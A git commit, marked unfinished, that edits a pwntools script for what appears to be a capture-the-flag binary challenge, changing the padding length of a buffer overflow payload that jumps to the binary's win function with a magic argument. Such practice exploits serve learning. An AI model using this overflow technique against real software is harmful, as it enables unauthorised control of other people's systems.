c915a7ddf2914c422052313bde97a4b2a5dacff4
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-18 16:41:38 -0400

    # NOT FINISHED

--- chall_10/10.py
+++ chall_10/10.py
@@ -2,6 +2,6 @@ from pwn import *
 binary = context.binary = ELF('./chall_10')
 p = process(binary.path)
 
-p.sendline(b'' + (0x308 - 0x4)*b'A' + p32(binary.sym.win) + p32(0) + p32(0x1a55fac3))
+p.sendline(b'' + (0x308 + 0x4)*b'A' + p32(binary.sym.win) + p32(0) + p32(0x1a55fac3))
 p.interactive()
 # NOT FINISHED
